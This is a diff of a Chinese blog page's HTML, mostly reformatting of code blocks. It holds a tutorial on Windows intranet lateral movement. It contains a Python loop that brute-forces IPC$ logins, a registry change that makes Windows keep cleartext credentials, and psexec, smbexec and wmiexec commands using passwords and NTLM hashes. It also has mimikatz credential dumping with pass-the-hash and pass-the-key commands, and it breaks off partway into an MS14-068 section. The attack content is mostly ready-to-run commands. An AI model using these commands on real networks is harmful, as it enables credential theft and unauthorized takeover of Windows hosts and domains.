xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>升级版：</p>
 <p>写脚本，把ip、passwd、username都变三重循环。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>time
-ips<span class="token operator">=</span><span class="token punctuation">&#123;</span>
-    <span class="token string">'10.1.1.1'</span><span class="token punctuation">,</span>
-    <span class="token string">'10.1.1.2'</span>
-<span class="token punctuation">&#125;</span>
-
-users<span class="token operator">=</span><span class="token punctuation">&#123;</span>
-    <span class="token string">'jiarong.gao'</span><span class="token punctuation">,</span>
-    <span class="token string">'ping.fang'</span>
-<span class="token punctuation">&#125;</span>
-
-passwd<span class="token operator">=</span><span class="token punctuation">&#123;</span>
-    <span class="token string">'666.com'</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>
-    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> mima <span class="token keyword">in</span> passwd<span class="token punctuation">:</span>
-        	payld<span class="token operator">=</span><span class="token string">"net use \\"</span><span class="token operator">+</span> "\"<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">'\ipc$ '</span><span class="token operator">+</span>mima<span class="token operator">+</span><span class="token string">' /user:'</span><span class="token operator">+</span>user
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--->'</span><span class="token operator">+</span>payld<span class="token operator">+</span><span class="token string">'&lt;---'</span><span class="token punctuation">)</span>
-            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>payld<span class="token punctuation">)</span>
-            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Python"><div class="codebox"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;10.1.1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;10.1.1.2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;jiarong.gao&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ping.fang&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passwd=&#123;</span><br><span class="line">    <span class="string">&#x27;666.com&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mima <span class="keyword">in</span> passwd:</span><br><span class="line">        	payld=<span class="string">&quot;net use \\&quot;</span>+ <span class="string">&quot;\&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:&#x27;+user</span></span><br><span class="line"><span class="string">            print(&#x27;---&gt;&#x27;+payld+&#x27;&lt;---&#x27;)</span></span><br><span class="line"><span class="string">            os.system(payld)</span></span><br><span class="line"><span class="string">            time.sleep(1)</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>将py文件变成exe文件：</strong></p>
 <blockquote>
@@ -267,43 +69,32 @@ passwd<span class="token operator">=</span><span class="token punctuation">&#123
 </ol>
 <p>windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows2003以后，认证方式均为NTLM Hash。</p>
 <p><strong>注册表修改</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Dockerfile"><div class="codebox"><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="psexec">psexec</span></h2><p>第一种：先建立IPC连接，再使用psexec（需要明文或hash传递）</p>
-<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$ &quot;666.com&quot; &#x2F;user:administrator
-psexec \\10.1.1.1 -s cmd           #-s以System运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">net</span> use \\<span class="number">10.1.1.1</span>\IPC$ <span class="string">&quot;666.com&quot;</span> /user:administrator</span><br><span class="line">psexec \\<span class="number">10.1.1.1</span> -s cmd           <span class="comment">#-s以System运行</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>第二种：不建立IPC连接。</p>
-<pre class="line-numbers language-none"><code class="language-none">psexec \\10.1.1.1 -u administrator -p 666.com -s cmd
-psexec -hashes :$HASH$ .&#x2F;administrator@10.1.1.1 
-psexec -hashes :$HASH$ domain&#x2F;administrator@10.1.1.1 
-psexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Elixir"><div class="codebox"><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">psexec \\<span class="number">10.1</span>.<span class="number">1.1</span> -u administrator -p <span class="number">666</span>.com -s cmd</span><br><span class="line">psexec -hashes <span class="symbol">:</span><span class="variable">$HASH</span><span class="variable">$ </span>./administrator<span class="variable">@10</span>.<span class="number">1.1</span>.<span class="number">1</span> </span><br><span class="line">psexec -hashes <span class="symbol">:</span><span class="variable">$HASH</span><span class="variable">$ </span>domain/administrator<span class="variable">@10</span>.<span class="number">1.1</span>.<span class="number">1</span> </span><br><span class="line">psexec -hashes <span class="symbol">:</span><span class="number">6</span>f8a61c6702f90ae246aa2a298fcdc35 ./administrator<span class="variable">@10</span>.<span class="number">1.1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>使用hashes传递时可能会出错，我们可以使用impacket工具包里的psexec，这个是基于官方的psexec二次开发的，可以进行hash的传递。但是容易被杀。</p>
 <h2><span id="smbexec">smbexec</span></h2><p>也是impacket工具包的一个软件。</p>
 <p>不用IPC连接</p>
-<pre class="line-numbers language-none"><code class="language-none">smbexec ZJ&#x2F;administrator:666.com@10.1.1.1
-smbexec .&#x2F;administrator:666.com@10.1.1.1
-smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1
-smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">smbexec</span> ZJ/administrator:<span class="number">666</span>.com@<span class="number">10.1.1.1</span></span><br><span class="line"><span class="attribute">smbexec</span> ./administrator:<span class="number">666</span>.com@<span class="number">10.1.1.1</span></span><br><span class="line"><span class="attribute">smbexec</span> -hashes :<span class="number">6</span>f8a61c6702f90ae246aa2a298fcdc35 ZJ/administrator@<span class="number">10.1.1.1</span></span><br><span class="line"><span class="attribute">smbexec</span> -hashes :<span class="number">6</span>f8a61c6702f90ae246aa2a298fcdc35 ./administrator@<span class="number">10.1.1.1</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h1><span id="wmicampwmiexec">wmic&amp;wmiexec</span></h1><p>WMI是通过<strong>135</strong>端口进行利用。支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。需要提权。</p>
 <p>#自带WMIC 明文传递 无回显</p>
-<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:10.1.1.1 &#x2F;user:administrator &#x2F;password:666.com process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\1.txt&quot;
-命令结果在1.txt里，且保存在10.1.1.1的电脑里。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Pgsql"><div class="codebox"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">10.1</span><span class="number">.1</span><span class="number">.1</span> /<span class="keyword">user</span>:administrator /<span class="keyword">password</span>:<span class="number">666.</span>com process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line">命令结果在<span class="number">1.</span>txt里，且保存在<span class="number">10.1</span><span class="number">.1</span><span class="number">.1</span>的电脑里。</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>#自带cscript明文传输 有回显</p>
-<pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 10.1.1.1 administrator 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cscript</span> //nologo wmiexec.vbs /shell <span class="number">10.1.1.1</span> administrator <span class="number">666</span>.com</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>#套件impacket的wmiexec  明文或hash传递 有回显exe版本</p>
-<pre class="line-numbers language-none"><code class="language-none">wmiexec .&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
-wmiexec ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
-wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1 &quot;whoami&quot;
-wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wmiexec</span> ./administrator:<span class="number">666</span>.com@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="attribute">wmiexec</span> ZJ/administrator:<span class="number">666</span>.com@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="attribute">wmiexec</span> -hashes :<span class="number">6</span>f8a61c6702f90ae246aa2a298fcdc35 ./administrator@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="attribute">wmiexec</span> -hashes :<span class="number">6</span>f8a61c6702f90ae246aa2a298fcdc35 ZJ/administrator@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
@@ -318,26 +109,19 @@ wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1
 <p>ptk：打了补丁才能用户才可以连接，采用AES256连接。</p>
 <h2><span id="pth">PTH</span></h2><p>ntlm 传递，工具：mimikatz</p>
 <p>首先用mimikatz得到ntlm值。</p>
-<pre class="line-numbers language-none"><code class="language-none">privilege::debug
-sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Arduino"><div class="codebox"><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>未打补丁的工作组及域连接：</p>
-<pre class="line-numbers language-none"><code class="language-none">privilege::debug
-sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35
-sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:zj /ntlm:6f8a61c6702f90ae246aa2a298fcdc35</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:6f8a61c6702f90ae246aa2a298fcdc35</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>然后会弹出一个cmd窗口，可以直接进行连接。</p>
-<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$
-dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Nginx"><div class="codebox"><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">net</span> use \\<span class="number">10.1.1.1</span>\IPC$</span><br><span class="line">dir \\<span class="number">10.1.1.1</span>\c$</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="ptk">PTK</span></h2><p>打了补丁<strong>kb2871997</strong>才能用</p>
 <p>首先要得到AES256的值，mimikatz：</p>
-<pre class="line-numbers language-none"><code class="language-none">privilege::debug
-sekurlsa::ekeys
-
-sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj.com &#x2F;aes256:6f88e6d06c3ecb95e37fe23b3ef372738ec67871b71606c588a1668ca62161ac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Nsis"><div class="codebox"><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">privilege::debug</span></span><br><span class="line"><span class="title function_">sekurlsa::ekeys</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">sekurlsa::pth</span> /<span class="literal">user</span>:administrator /domain:zj.com /aes256:<span class="number">6</span>f88e6d06c3ecb95e37fe23b3ef372738ec67871b71606c588a1668ca62161ac</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
@@ -345,204 +129,165 @@ sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zj.com &#x2F;aes256:6f88e6d0
 <p>能实现普通用户直接获取域控system权限</p>
 <p>#MS14-068 powershell执行</p>
 <p>1.查看当前sid </p>
-<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /user</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 